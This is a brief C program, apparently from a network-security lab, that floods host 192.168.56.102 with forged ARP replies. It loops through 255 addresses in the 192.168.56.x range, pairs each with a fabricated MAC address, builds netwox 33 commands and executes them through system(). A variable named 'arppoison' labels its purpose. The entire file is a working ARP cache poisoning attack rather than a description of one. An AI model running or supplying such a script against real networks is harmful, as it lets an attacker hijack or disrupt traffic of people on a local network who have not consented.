#include <stdio.h>
#include <string.h>
//using namespace std

int main()
{
	int i;
	char addr[50];
	char ethadd[50];
	char arppoison[1000];
	for(i=0;i<255;i++)
	{
		sprintf(addr,"192.168.56.%d",i);

		sprintf(ethadd,"%x:%x:%x:%x:%x:%x",i,i,i,i,i,i);
		sprintf(arppoison,"netwox 33 -e 2 -i \"192.168.56.102\" -g %s --device eth13 -a %s -f %s -b 08:00:27:1A:C1:21 -h 08:00:27:1A:C1:21 ",addr,ethadd,ethadd);

/*

netwox 33 -e 2 -i "192.168.56.102" -g "192.168.56.1" 1--device eth13 -a %s -b 08:00:27:1A:C1:21 -h 08:00:27:1A:C1:21 
*/
		system(arppoison);
	}
}

